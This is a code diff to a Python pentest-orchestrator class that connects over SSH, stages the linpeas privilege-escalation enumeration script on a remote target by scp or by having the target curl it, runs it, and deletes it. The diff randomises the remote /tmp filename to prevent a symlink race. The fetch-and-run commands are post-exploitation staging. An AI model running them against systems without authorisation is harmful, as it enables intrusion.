@@ -23,6 +23,7 @@ crashing the orchestrator.
 from __future__ import annotations
 
 import re
+import secrets
 from dataclasses import dataclass, field
 from typing import Any, Optional
 
@@ -100,15 +101,21 @@ class LinpeasRunner:
                 password=password, client_keys=client_keys,
                 known_hosts=None,                  # operator-driven; trust on first use
             ) as conn:
+                # Drop the script under an unpredictable name so a hostile
+                # multi-user target can't pre-create/symlink a fixed /tmp path we
+                # then chmod +x and execute (TOCTOU on a world-writable dir).
+                # This "/tmp" path is on the *remote* SSH target (a command
+                # string), not a local temp file; standard post-ex staging dir.
+                remote_script = f"/tmp/.heaven-{secrets.token_hex(8)}.sh"
                 # Load script: from disk if provided, else fetch via curl on target
                 if script_path:
                     # scp the local script directly; no need to slurp its bytes first
                     await asyncssh.scp(  # type: ignore[attr-defined]
-                        (script_path,), (conn, "/tmp/linpeas.sh"),
+                        (script_path,), (conn, remote_script),
                     )
                 else:
                     # Fall back to fetching live on the target (requires curl)
-                    fetch_cmd = f"curl -sL {LINPEAS_URL} -o /tmp/linpeas.sh"
+                    fetch_cmd = f"curl -sL {LINPEAS_URL} -o {remote_script}"
                     fetch = await conn.run(fetch_cmd, check=False, timeout=30)
                     if fetch.exit_status != 0:
                         return LinpeasResult(
@@ -116,10 +123,10 @@ class LinpeasRunner:
                             error=f"could not fetch linpeas.sh on target: {_as_text(fetch.stderr)}",
                         )
 
-                run_cmd = "chmod +x /tmp/linpeas.sh && /tmp/linpeas.sh -q -N 2>&1"
+                run_cmd = f"chmod +x {remote_script} && {remote_script} -q -N 2>&1"
                 run = await conn.run(run_cmd, check=False, timeout=timeout)
                 # Always cleanup
-                await conn.run("rm -f /tmp/linpeas.sh", check=False, timeout=5)
+                await conn.run(f"rm -f {remote_script}", check=False, timeout=5)
 
                 output = _as_text(run.stdout)
                 parsed = _parse_linpeas(output)
